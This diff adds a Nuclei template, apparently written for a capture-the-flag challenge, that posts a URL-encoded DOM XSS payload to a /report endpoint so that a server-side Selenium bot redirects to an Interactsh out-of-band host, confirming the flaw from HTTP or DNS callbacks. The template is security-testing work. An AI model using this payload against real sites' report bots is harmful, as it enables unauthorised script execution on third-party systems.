@@ -1,0 +1,26 @@
+id: ctf-oob-xss-report
+
+info:
+  name: CTF DOM XSS via Report Bot (OOB)
+  author: jebeen
+  severity: critical
+  description: |
+    Report 기능을 이용하여 서버 측 봇(Selenium)에서 DOM XSS를 트리거하고,
+    OOB(Interactsh)로 연결을 유도하여 취약점을 확인합니다.
+  tags: xss, ctf
+
+requests:
+  - raw:
+      - |
+        POST /report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        payload=http%3A%2F%2F127.0.0.1%3A8000%2Fxss%3Fpayload%3D%253Cdiv%2520data-code%253D1%253E%253C%252Fdiv%253E%23window.location.href%3D%27http%3A%2F%2F{{interactsh-url}}%27
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Interactsh 서버로 요청이 들어왔는지 확인
+        words:
+          - "http"
+          - "dns"
